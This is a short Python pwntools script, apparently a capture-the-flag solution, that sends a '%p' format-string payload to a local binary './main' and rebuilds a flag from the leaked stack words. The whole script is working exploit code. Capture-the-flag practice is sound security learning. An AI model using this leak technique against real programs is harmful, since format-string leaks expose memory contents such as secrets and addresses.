from pwn import *

io = process('./main')
io.recvuntil(b'print: ')
payload = b'%p'*12
io.sendline(payload)
res = io.recvline(keepends=False).split(b'0x')
print(res)

flag = ''
for i in range(5,10):
    part = bytes.fromhex(res[i].decode()).decode()[::-1]
    flag += part

print(flag)